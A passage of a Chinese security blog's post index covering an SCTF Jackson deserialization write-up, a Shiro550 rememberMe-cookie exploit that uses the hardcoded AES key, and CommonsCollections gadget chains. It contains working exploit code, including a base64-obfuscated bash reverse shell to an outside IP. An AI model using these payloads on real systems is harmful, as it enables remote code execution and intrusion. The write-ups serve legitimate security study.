false\"\n```\n\n得到如下ggc：\n\n```tex\nrO0ABXNyADZzY2FsYS5jb2xsZWN0aW9uLmltbXV0YWJsZS5MYXp5TGlzdCRTZXJpYWxpemF0aW9uUHJveHkAAAAAAAAAAwMAAHhwc3IAJnNjYWxhLnJ1bnRpbWUuTW9kdWxlU2VyaWFsaXphdGlvblByb3h5AAAAAAAAAAECAAFMAAttb2R1bGVDbGFzc3QAEUxqYXZhL2xhbmcvQ2xhc3M7eHB2cgAmc2NhbGEuY29sbGVjdGlvbi5nZW5lcmljLlNlcmlhbGl6ZUVuZCQAAAAAAAAAAwIAAHhwc3IAI3NjYWxhLmNvbGxlY3Rpb24uaW1tdXRhYmxlLkxhenlMaXN0AAAAAAAAAAMDAAVaAAhiaXRtYXAkMFoADW1pZEV2YWx1YXRpb25aADNzY2FsYSRjb2xsZWN0aW9uJGltbXV0YWJsZSRMYXp5TGlzdCQkc3RhdGVFdmFsdWF0ZWRMAAlsYXp5U3RhdGV0ABFMc2NhbGEvRnVuY3Rpb24wO0wAKnNjYWxhJGNvbGxlY3Rpb24kaW1tdXRhYmxlJExhenlMaXN0JCRzdGF0ZXQAK0xzY2FsYS9jb2xsZWN0aW9uL2ltbXV0YWJsZS9MYXp5TGlzdCRTdGF0ZTt4cAAAAXNyAExzY2FsYS5zeXMucHJvY2Vzcy5Qcm9jZXNzQnVpbGRlckltcGwkRmlsZU91dHB1dCQkYW5vbmZ1biQkbGVzc2luaXQkZ3JlYXRlciQzAAAAAAAAAAACAAJaAAhhcHBlbmQkMUwABmZpbGUkMnQADkxqYXZhL2lvL0ZpbGU7eHAAc3IADGphdmEuaW8uRmlsZQQtpEUODeT/AwABTAAEcGF0aHQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwdAAWc2VjdXJpdHkvYmFsY2tsaXN0LnR4dHcCAC94c3EAfgACdnIAMHNjYWxhLmNvbGxlY3Rpb24uaW1tdXRhYmxlLkxhenlMaXN0JFN0YXRlJEVtcHR5JAAAAAAAAAADAgAAeHB4eA==\n```\n\n将这段数据打入即可删除黑名单：\n\n![image-20230628200750736](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230628200750736.png)\n\n再进行jackson反序列化即可，ggc如下：\n\n```java\nimport com.fasterxml.jackson.databind.node.POJONode;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\n\n\nimport javax.management.BadAttributeValueExpException;\nimport java.io.*;\nimport java.lang.reflect.Field;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.util.Base64;\n\npublic class EXP {\n    public static void main(String[] args) throws Exception {\n        TemplatesImpl templates = new TemplatesImpl();\n        setFieldValue(templates, \"_name\", \"y1zh3e7\");\n        byte[] code= Files.readAllBytes(Paths.get(\"/Users/y1zh3e7/CodeWorkSpace/JavaWeb/sctf/Payload/src/main/java/Cal.class\"));\n        byte[][] codes={code};\n        setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl());\n        setFieldValue(templates,\"_bytecodes\",codes);\n        POJONode jsonNodes = new POJONode(templates);\n        BadAttributeValueExpException exp = new BadAttributeValueExpException(11);\n        Field val = Class.forName(\"javax.management.BadAttributeValueExpException\").getDeclaredField(\"val\");\n        val.setAccessible(true);\n        val.set(exp,jsonNodes);\n        //deserial(serial(exp));\n        System.out.println(serial(exp));\n    }\n\n    public static String serial(Object o) throws IOException, NoSuchFieldException {\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        ObjectOutputStream oos = new ObjectOutputStream(baos);\n        oos.writeObject(o);\n        oos.close();\n\n        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());\n        return base64String;\n\n    }\n\n    private static void setFieldValue(Object obj, String field, Object arg) throws Exception{\n        Field f = obj.getClass().getDeclaredField(field);\n        f.setAccessible(true);\n        f.set(obj, arg);\n    }\n}\n\n```\n\n恶意类：\n\n```java\nimport java.io.IOException;\n\nimport com.sun.org.apache.xalan.internal.xsltc.DOM;\nimport com.sun.org.apache.xalan.internal.xsltc.TransletException;\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;\nimport com.sun.org.apache.xml.internal.serializer.SerializationHandler;\n\npublic class Cal extends AbstractTranslet{\n    {\n        try {\n            Runtime.getRuntime().exec(\"bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzQzLjE0My4yNDYuNzMvNzc3NyAwPiYx}|{base64,-d}|{bash,-i}\");\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n\n    }\n\n    @Override\n    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {\n\n    }\n\n    @Override\n    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {\n\n    }\n}\n\n```\n\n然后这里会报个错，出在BaseJsonNode这个文件上的writeReplace方法，我们可以把这个文件源码反编译出来把这个方法删掉，然后再扔到生成EXP下的项目去就可以正常生成了：\n\n![image-20230701151210042](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230701151210042.png)\n\nBaseJsonNode.java:\n\n```java\npackage com.fasterxml.jackson.databind.node;\n\nimport com.fasterxml.jackson.core.JsonGenerator;\nimport com.fasterxml.jackson.core.JsonParser;\nimport com.fasterxml.jackson.core.JsonToken;\nimport com.fasterxml.jackson.core.ObjectCodec;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.SerializerProvider;\nimport com.fasterxml.jackson.databind.jsontype.TypeSerializer;\nimport java.io.IOException;\nimport java.io.Serializable;\n\npublic abstract class BaseJsonNode extends JsonNode implements Serializable {\n    private static final long serialVersionUID = 1L;\n\n    public final JsonNode findPath(String fieldName) {\n        JsonNode value = findValue(fieldName);\n        if (value == null)\n            return MissingNode.getInstance();\n        return value;\n    }\n\n    public abstract int hashCode();\n\n    public JsonNode required(String fieldName) {\n        return (JsonNode)_reportRequiredViolation(\"Node of type `%s` has no fields\", new Object[] { getClass().getSimpleName() });\n    }\n\n    public JsonNode required(int index) {\n        return (JsonNode)_reportRequiredViolation(\"Node of type `%s` has no indexed values\", new Object[] { getClass().getSimpleName() });\n    }\n\n    public JsonParser traverse() {\n        return (JsonParser)new TreeTraversingParser(this);\n    }\n\n    public JsonParser traverse(ObjectCodec codec) {\n        return (JsonParser)new TreeTraversingParser(this, codec);\n    }\n\n    public abstract JsonToken asToken();\n\n    public JsonParser.NumberType numberType() {\n        return null;\n    }\n\n    public abstract void serialize(JsonGenerator paramJsonGenerator, SerializerProvider paramSerializerProvider) throws IOException;\n\n    public abstract void serializeWithType(JsonGenerator paramJsonGenerator, SerializerProvider paramSerializerProvider, TypeSerializer paramTypeSerializer) throws IOException;\n\n    public String toString() {\n        return InternalNodeMapper.nodeToString(this);\n    }\n\n    public String toPrettyString() {\n        return InternalNodeMapper.nodeToPrettyString(this);\n    }\n}\n\n```\n\n监听反弹shell即可\n","tags":["SCTF"],"categories":["CTF"]},{"title":"Shiro550","url":"/2023/06/08/Shiro550/","content":"# Shiro550反序列化\n\n## 环境配置\n\n- 代码准备，需要1.2.4版本的shiro代码来运行：\n\n  ```bash\n  git clone https://github.com/apache/shiro.git\n  cd shiro\n  git checkout shiro-root-1.2.4\n  ```\n\n- 修改maven依赖：在项目根目录的pom.xml下修改jstl依赖项为\n\n```xml\n    <dependency>\n                <groupId>javax.servlet</groupId>\n                <artifactId>servlet-api</artifactId>\n                <version>2.5</version>\n                <scope>provided</scope>\n            </dependency>\n```\n\n- jdk及tomcat版本选用：\n\n  jdk选用1.7：[Java Archive Downloads - Java SE 7 (oracle.com)](https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html)\n\n  tomcat选用8.x：[Apache Tomcat® - Apache Tomcat 8 Software Downloads](https://tomcat.apache.org/download-80.cgi)\n\n- idea中配置tomcat并运行shiro项目：\n\n  等待maven依赖导入完成后就可以配置tomcat了，一部分maven依赖可能无法导入，但不影响项目正常启动。\n\n  tomcat的配置，此外也要对项目工程及sdk和java编译版本选择为1.7，这里要将HTTP port改为其他端口，因为一会我们需要用burpsuite抓包，burpsuite默认端口也是8080，会造成端口冲突：![image-20230607143914577](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230607143914577.png)\n\n  ![image-20230607143930952](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230607143930952.png)\n\n- 成功启动后如下：\n\n  ![image-20230607144051580](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230607144051580.png)\n\n![image-20230607144108059](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230607144108059.png)\n\n## URLDNS探测Shiro550\n\n\n\n我们在搭建好的网站上进行登陆，并且要勾选Rememberme后抓包，可以发现在Server端返回的Cookie中有一个rememberMe字段，并且其中看起来像是加密储存了一些内容：\t![image-20230607164039278](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230607164039278.png)\n\n我们可以在shiro的源码中发现实现这个功能的类`CookieRememberMeManager`，找到其中的`getRememberedSerializedIdentity`这个方法，可以看的出来这个方法会从请求中获取这个Cookie并返回，所以接下来的逻辑就是找哪个方法调用了这个方法，然后对Cookie进行解密等处理：\n\n```Java\n  protected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) {\n\n        if (!WebUtils.isHttp(subjectContext)) {\n            if (log.isDebugEnabled()) {\n                String msg = \"SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a \" +\n                        \"servlet request and response in order to retrieve the rememberMe cookie. Returning \" +\n                        \"immediately and ignoring rememberMe operation.\";\n                log.debug(msg);\n            }\n            return null;\n        }\n\n        WebSubjectContext wsc = (WebSubjectContext) subjectContext;\n        if (isIdentityRemoved(wsc)) {\n            return null;\n        }\n\n        HttpServletRequest request = WebUtils.getHttpRequest(wsc);\n        HttpServletResponse response = WebUtils.getHttpResponse(wsc);\n\n        String base64 = getCookie().readValue(request, response);\n        // Browsers do not always remove cookies immediately (SHIRO-183)\n        // ignore cookies that are scheduled for removal\n        if (Cookie.DELETED_COOKIE_VALUE.equals(base64)) return null;\n\n        if (base64 != null) {\n            base64 = ensurePadding(base64);\n            if (log.isTraceEnabled()) {\n                log.trace(\"Acquired Base64 encoded identity [\" + base64 + \"]\");\n            }\n            byte[] decoded = Base64.decode(base64);\n            if (log.isTraceEnabled()) {\n                log.trace(\"Base64 decoded byte array length: \" + (decoded != null ? decoded.length : 0) + \" bytes.\");\n            }\n            return decoded;\n        } else {\n            //no cookie set - new site visitor?\n            return null;\n        }\n    }\n```\n\n在`org/apache/shiro/mgt/AbstractRememberMeManager`这个类中我们找到了`getRememberedPrincipals`这个方法调用了`getRememberedSerializedIdentity`，然后把这个Cookie用`convertBytesToPrincipals`进行处理，我们跟进这个方法：\n\n```Java\n    public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) {\n        PrincipalCollection principals = null;\n        try {\n            byte[] bytes = getRememberedSerializedIdentity(subjectContext);\n            //SHIRO-138 - only call convertBytesToPrincipals if bytes exist:\n            if (bytes != null && bytes.length > 0) {\n                principals = convertBytesToPrincipals(bytes, subjectContext);\n            }\n        } catch (RuntimeException re) {\n            principals = onRememberedPrincipalFailure(re, subjectContext);\n        }\n\n        return principals;\n    }\n```\n\n可以看到这个方法做了两件事，一个是对这个传过来的Cookie进行decrypt（解密），一个是对这个Cookie进行deserialize（反序列化），我们分别跟进这两个方法看一下：\n\n```java\n    protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) {\n        if (getCipherService() != null) {\n            bytes = decrypt(bytes);\n        }\n        return deserialize(bytes);\n    }\n```\n\n先来看`deserialize`：\n\n```java\n    protected PrincipalCollection deserialize(byte[] serializedIdentity) {\n        return getSerializer().deserialize(serializedIdentity);\n    }\n```\n\n这个函数把Cookie传给了`getSerializer().deserialize()`这个方法，`getSerializer`的返回值是`serializer`，这个变量在构造函数内进行了初始化，是一个`DefaultSerializer`，因此我们跟进`DefaultSerializer.deserialize`\n\n```java\n    public Serializer<PrincipalCollection> getSerializer() {\n        return serializer;\n    }\n\n## 构造函数\npublic AbstractRememberMeManager() {\n        this.serializer = new DefaultSerializer<PrincipalCollection>();\n        this.cipherService = new AesCipherService();\n        setCipherKey(DEFAULT_CIPHER_KEY_BYTES);\n    }\n```\n\n可以发现就是实现了一个反序列化，因此确实存在反序列化漏洞的点，我们接下来就要破解上面的加密算法，从而能让我们自己的payload加密后发过去：\n\n```java\n    public T deserialize(byte[] serialized) throws SerializationException {\n        if (serialized == null) {\n            String msg = \"argument cannot be null.\";\n            throw new IllegalArgumentException(msg);\n        }\n        ByteArrayInputStream bais = new ByteArrayInputStream(serialized);\n        BufferedInputStream bis = new BufferedInputStream(bais);\n        try {\n            ObjectInputStream ois = new ClassResolvingObjectInputStream(bis);\n            @SuppressWarnings({\"unchecked\"})\n            T deserialized = (T) ois.readObject();\n            ois.close();\n            return deserialized;\n        } catch (Exception e) {\n            String msg = \"Unable to deserialze argument byte array.\";\n            throw new SerializationException(msg, e);\n        }\n    }\n```\n\n回到decrypt上，decrypt方法先通过`getDecryptionCipherKey`方法获取了一个密钥，然后将Cookie交给`cipherService.decrypt`方法解密：\n\n```java\n   protected byte[] decrypt(byte[] encrypted) {\n        byte[] serialized = encrypted;\n        CipherService cipherService = getCipherService();\n        if (cipherService != null) {\n            ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());\n            serialized = byteSource.getBytes();\n        }\n        return serialized;\n    }\n```\n\n可以看到`cipherService`是通过`getCipherService`方法得到的，跟进发现返回值在构造函数中初始化，其实到这里可以看的出来就是个Aes加密了（并且下面的setCipherKey其实就是AES的密钥，不过我们假装不知道一会再找回来），继续跟进`AesCipherService`的话可以看到Aes加密的具体方式，这里就不展示出来了：\n\n```java\n    public AbstractRememberMeManager() {\n        this.serializer = new DefaultSerializer<PrincipalCollection>();\n        this.cipherService = new AesCipherService();\n        setCipherKey(DEFAULT_CIPHER_KEY_BYTES);\n    }\n```\n\n我们再回头看`getDecryptionCipherKey`方法获取密钥的逻辑，跟进：\n\n```java\n    public byte[] getDecryptionCipherKey() {\n        return decryptionCipherKey;\n    }\n```\n\n再找`decryptionCipherKey`这个属性在哪里进行的赋值，可以发现是通过setter赋值（Find Usage -> Value Write）：\n\n```java\n   public void setDecryptionCipherKey(byte[] decryptionCipherKey) {\n        this.decryptionCipherKey = decryptionCipherKey;\n    }\n```\n\n接着看哪里调用了`setDecryptionCipherKey`方法，发现在`setCipherKey`方法中：\n\n```java\n    public void setCipherKey(byte[] cipherKey) {\n        //Since this method should only be used in symmetric ciphers\n        //(where the enc and dec keys are the same), set it on both:\n        setEncryptionCipherKey(cipherKey);\n        setDecryptionCipherKey(cipherKey);\n    }\n```\n\n最终其实还是在构造函数传了密钥，并且可以发现密钥是一个写死的常量，因此问题就出在这里，在shiro1.2.4版本下，密钥是写死的，并且采用的是AES加密（对称加密），所以我们可以通过这个密钥自己构造payload并加密后传过去进行反序列化攻击：\n\n```java\npublic AbstractRememberMeManager() {\n        this.serializer = new DefaultSerializer<PrincipalCollection>();\n        this.cipherService = new AesCipherService();\n        setCipherKey(DEFAULT_CIPHER_KEY_BYTES);\n    }\n\n private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(\"kPH+bIxk5D2deZiIxcaaaA==\");\n```\n\n------\n\n我们看一下在这个包中的Maven依赖有哪个是我们可攻击的，发现存在commons-collections3.x，不过可以发现这个依赖项的scope是test，也就是说只有在test中运行时这个依赖才会被导入，那么真实条件下是不存在这个依赖的，所以我们是没有办法通过这个依赖进行攻击的：\n\n![image-20230607172709399](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230607172709399.png)\n\n实际上可以攻击的依赖是commons-beanutils这个依赖，不过我们这里先用Java自带的URLDNS进行一下测试\n\n![image-20230607172853432](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230607172853432.png)\n\n------\n\n将URLDNS的利用类序列化出来，我这里序列化后保存的文件名叫做ser.bin：\n\n```java\npackage ysoserial.payloads.util.Test;\n\n\nimport java.lang.reflect.Field;\nimport java.net.URL;\nimport java.util.HashMap;\n\nimport static ysoserial.payloads.util.Test.util.Serialize.serialize;\nimport static ysoserial.payloads.util.Test.util.Unserialize.unserialize;\n\npublic class URLDNSTest{\n    public static void main(String[] args) throws Exception{\n      // url为接收dns请求的url 自己修改\n        URL url = new URL(\"xxx.com\");\n\n        Class c = url.getClass();\n        Field hashcodeField = c.getDeclaredField(\"hashCode\");\n        hashcodeField.setAccessible(true);\n        hashcodeField.set(url,1234);\n\n        HashMap hashMap = new HashMap();\n        hashMap.put(url,1);\n\n        hashcodeField.set(url,-1);\n        serialize(hashMap);\n\n    }\n}\n```\n\n这是根据shiro加密的逻辑写出的构造新payload的脚本：\n\n```python\nimport base64\nimport uuid\nfrom random import Random\nfrom Crypto.Cipher import AES\n\ndef get_file_data(filename):\n    with open(filename, 'rb') as f:\n        data = f.read()\n    return data\n\ndef aes_enc(data):\n     BS = AES.block_size\n     pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()\n     key = \"kPH+bIxk5D2deZiIxcaaaA==\"\n     mode = AES.MODE_CBC\n     iv = uuid.uuid4().bytes\n     encryptor = AES.new(base64.b64decode(key), mode, iv)\n     ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))\n     return ciphertext\n\ndef aes_dec(enc_data):\n    enc_data = base64.b64decode(enc_data)\n    unpad = lambda s : s[:-s[-1]]\n    key = \"kPH+bIxk5D2deZiIxcaaaA==\"\n    mode = AES.MODE_CBC\n    iv = enc_data[:16]\n    encryptor = AES.new(base64.b64decode(key), mode, iv)\n    plaintext = encryptor.decrypt(enc_data[16:])\n    plaintext = unpad(plaintext)\n    return plaintext\n\nif __name__ == '__main__':\n    data = get_file_data(\"ser.bin\")\n    print(aes_enc(data))\n```\n\n把ser.bin和脚本放在同一目录下运行脚本即可：\n\n![image-20230608162831994](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230608162831994.png)\n\n![image-20230608162901350](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230608162901350.png)\n\n替换Cookie进行发包，需要注意的是要将Cookie中的SessionId删除掉，否则Shiro会直接用Sessionid而不是rememberme：\n![image-20230608163110965](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230608163110965.png)\n\n![image-20230608163121777](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230608163121777.png)\n\n关于如何通过cb链命令执行先🐦一手 有空补上来\n","tags":["Shiro550反序列化"],"categories":["WebSec"]},{"title":"CommonsCollections 2+4+5+7","url":"/2023/05/30/CommonsCollections-2-4-5-7/","content":"\n# CommonsCollections 2+4+5+7\n\n## CommonsCollections 4\n\n我们在之前的CC3中是通过动态类加载初始化一个类，从而执行类中构造的恶意代码，CC4和CC3的最终代码执行位置都是相同的，不过前面的构造过程可能会有一些差别。\n\nCC4这条链用了CommonsCollections4这个依赖中的一些属性，我们先从ChainedTransformer.transform入手，往回找其他的利用点：\n\n![image-20230528100955152](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230528100955152.png)\n\n我们在CC4的comprators包下找到了`TransformingComprator.compare`这个public方法，并且`TransformingComprator`这个类是可序列化的：\n\n![image-20230528101506635](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230528101506635.png)\n\n我们再往下找谁调用了`TransformingComprator.compare`，最后在java原生util包下找到了`PriorityQueue`（优先队列）中的`siftDownUsingComparator`方法：\n\n![image-20230528102227728](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230528102227728.png)\n\n并且就在这个方法的上面，`siftdown`方法调用了`siftDownUsingComparator`方法，所以接着找哪里调用了`siftdown`.\n\n![image-20230528102422276](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230528102422276.png)\n\n还是在优先队列这个类中，`heapify`方法调用了`siftdown`，这里要注意想要成功调用siftDown，就要让`size进行右移运算后-1` >= 0，所以这里size至少要为2：\n\n![image-20230528102549322](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230528102549322.png)\n\n在往下找，找到CC4的终点，在优先队列的readObject方法中调用了`heapify`：\n\n![image-20230528102647049](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230528102647049.png)\n\n可以发现CC4与CC3唯一在CommonsCollections中依赖的不同就是在`TransformingComprator`这个类中，因为优先队列是java中自带的一个工具类，而之所以这条利用链在CC3中用不了是因为CC3包中这个类不能反序列化，而在CC4包中，这个类却继承了Serializable，所以在CC4中就可以使用这条链进行攻击了\n\nCC3:\n\n![image-20230528104348059](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230528104348059.png)\n\nCC4:\n\n![image-20230528104155616](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230528104155616.png)\n\n正向构造利用链：\n\n```Java\npackage ysoserial.payloads.util.Test.util;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport org.apache.commons.collections4.comparators.TransformingComparator;\nimport org.apache.commons.collections4.functors.ChainedTransformer;\nimport org.apache.commons.collections4.Transformer;\nimport org.apache.commons.collections4.functors.ConstantTransformer;\nimport org.apache.commons.collections4.functors.InstantiateTransformer;\n\nimport javax.xml.transform.Templates;\nimport java.io.IOException;\nimport java.lang.reflect.Field;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.util.PriorityQueue;\n\nimport static ysoserial.payloads.util.Test.util.Serialize.serialize;\nimport static ysoserial.payloads.util.Test.util.Unserialize.unserialize;\n\npublic class CC4Test {\n    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {\n        TemplatesImpl templatesimpl = new TemplatesImpl();\n        byte[] code  = Files.readAllBytes(Paths.get(\"/Users/y1zh3e7/web安全/Java安全/ysoserial-master/target/classes/ysoserial/payloads/util/Test/Calc.class\"));\n        byte[][] codes = new byte[][]{code};\n        Class tem = Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\");\n\n        Field bytecodes = tem.getDeclaredField(\"_bytecodes\");\n        bytecodes.setAccessible(true);\n        bytecodes.set(templatesimpl,codes);\n\n        Field name = tem.getDeclaredField(\"_name\");\n        name.setAccessible(true);\n        name.set(templatesimpl,\"aaa\");\n\n\n        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesimpl});\n        Transformer[] transformers = new Transformer[]{\n            new ConstantTransformer(TrAXFilter.class),\n            instantiateTransformer\n        };\n        ChainedTransformer ctf = new ChainedTransformer(transformers);\n\n        TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(123));\n\n        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);\n\n        priorityQueue.add(1);\n        priorityQueue.add(2);\n\n        Field transformingComparatorFiled = transformingComparator.getClass().getDeclaredField(\"transformer\");\n        transformingComparatorFiled.setAccessible(true);\n        transformingComparatorFiled.set(transformingComparator,ctf);\n\n        serialize(priorityQueue);\n        unserialize(\"ser.bin\");\n\n    }\n}\n\n```\n\n​\t\n\n## CommonsCollections 2\n\nCC2这条链和CC4不同的是在加载恶意类后，会通过调用`TemplatesImpl.newTransformer`从而初始化恶意类，执行代码，在CC4链中，我们可以通过调用TraxFilter然后再往前接着找利用连，而CC2则是在这里通过直接调用`InvokerTransformer.transform`直接调用`TemplatesImpl.newTransformer`:\n\n![image-20230530154856913](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230530154856913.png)\n\n构造链如下：\n\n```java\npackage ysoserial.payloads.util.Test;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport org.apache.commons.collections4.comparators.TransformingComparator;\nimport org.apache.commons.collections4.functors.ConstantTransformer;\nimport org.apache.commons.collections4.functors.InvokerTransformer;\n\nimport java.lang.reflect.Field;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.util.PriorityQueue;\n\nimport static ysoserial.payloads.util.Test.util.Serialize.serialize;\nimport static ysoserial.payloads.util.Test.util.Unserialize.unserialize;\n\npublic class CC2Test {\n    public static void main(String[] args) throws Exception{\n        TemplatesImpl templatesimpl = new TemplatesImpl();\n        byte[] code  = Files.readAllBytes(Paths.get(\"/Users/y1zh3e7/web安全/Java安全/ysoserial-master/target/classes/ysoserial/payloads/util/Test/Calc.class\"));\n        byte[][] codes = new byte[][]{code};\n        Class tem = Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\");\n\n        Field bytecodes = tem.getDeclaredField(\"_bytecodes\");\n        bytecodes.setAccessible(true);\n        bytecodes.set(templatesimpl,codes);\n\n        Field name = tem.getDeclaredField(\"_name\");\n        name.setAccessible(true);\n        name.set(templatesimpl,\"aaa\");\n\n        InvokerTransformer invokerTransformer = new InvokerTransformer(\"newTransformer\",new Class[]{},new Object[]{});\n\n        TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(123));\n\n        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);\n\n        priorityQueue.add(templatesimpl);\n        priorityQueue.add(2);\n\n        Field transformingComparatorFiled = transformingComparator.getClass().getDeclaredField(\"transformer\");\n        transformingComparatorFiled.setAccessible(true);\n        transformingComparatorFiled.set(transformingComparator,invokerTransformer);\n\n        serialize(priorityQueue);\n        unserialize(\"ser.bin\");\n\n\n\n    }\n}\n\n```\n\n\n\n## CommonsCollections 5 && CommonsCollections 7\n\n这两条链子就和CC1、6的方式一样了，都是通过调用`Runtime.exec`来命令执行，不过调用readObject的入口点不一样了，具体如下：\n\nCC5:\n\nBadAttributeValueExpException.readObject -->  TiedMapEntry.toString  -->  LazyMap.get，后续则和CC1一样\n\nCC7:\n\nHashTable.readObject  -->  AbstractMap.equals --> LazyMay.get，后续和CC1一样\n\n\n\n## 所有调用链的调用过程：\n\n![image-20230530161918857](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230530161918857.png)\n\n\n\n\n","tags":["Java反序列化"],"categories":["WebSec"]},{"title":"CommonsCollections3","url":"/2023/05/20/CommonsCollections3/","content":"# CC1打不通时的另外一条链CC3\n\n在CC1和CC6中，我们最终弹计算器都是通过`Runtime.exec`进行调用，从CC3我们要介绍一种不通过Runtime来弹计算器的方法，也就是Java中常提到的动态类加载，动态类加载可以让我们通过一个路径来加载一个恶意类，如果这个恶意类在`静态代码块`或`构造代码块`中写入了恶意方法，那么我们就可以通过找一条链子来初始化这个类（一般在进行实例化时会对类进行初始化），从而达到代码块中的代码执行。\n\nClassLoader中的defineClass最终实现了类的动态加载（后面还有一些过程但已经是依靠c来实现的了），在ClassLoader中可以看到一堆defineClass，我们查找用法，看一下哪个defineClass在别处被调用了，而且权限最好是default或者public，方便我们利用，最终锁定下面这个：\n\n```java\nprotected final Class<?> defineClass(String name, byte[] b, int off, int len)\n        throws ClassFormatError\n```\n\n这个defineClass被调用的点在`com.sun.org.apache.xalan.internal.xsltc.trax`中的`TemplatesImpl.TransletClassLoader`下，也是一个defineClass：\n\n![image-20230206143718657](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143718657.png)\n\n这个defineClass又在当前类中被`defineTransletClasses`调用：\n\n![image-20230206143601848](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143601848.png)\n\n`defineTransletClasses`同类下有三个被调用点，我们看一下哪个方法可以被我们利用：\n\n![image-20230206143620851](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143620851.png)\n\n第一个返回`_class`：\n\n```java\nprivate synchronized Class[] getTransletClasses() {\n        try {\n            if (_class == null) defineTransletClasses();\n        }\n        catch (TransformerConfigurationException e) {\n            // Falls through\n        }\n        return _class;\n    }\n```\n\n第二个返回了`_class`的下标：\n\n```java\npublic synchronized int getTransletIndex() {\n        try {\n            if (_class == null) defineTransletClasses();\n        }\n        catch (TransformerConfigurationException e) {\n            // Falls through\n        }\n        return _transletIndex;\n    }\n```\n\n第三个方法我们主要看newInstance这里，这个`_class[_transletIndex]`可控（通过上面找到的`defineTransletClasses`动态加载进来），如果我们让_class为我们所构造的恶意类并让它newInstance，那么就可以执行恶意类中的静态/构造代码块中的代码，所以我们接着找这个方法的调用点：\n\n```java\nprivate Translet getTransletInstance()\n        throws TransformerConfigurationException {\n        try {\n            if (_name == null) return null;\n\n            if (_class == null) defineTransletClasses();\n\n            // The translet needs to keep a reference to all its auxiliary\n            // class to prevent the GC from collecting them\n            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();\n```\n\n下一调用点还是在这个类中，我们找到newTransformer()这个方法：\n\n```java\npublic synchronized Transformer newTransformer()\n        throws TransformerConfigurationException\n    {\n        TransformerImpl transformer;\n\n        transformer = new TransformerImpl(getTransletInstance(), _outputProperties,\n            _indentNumber, 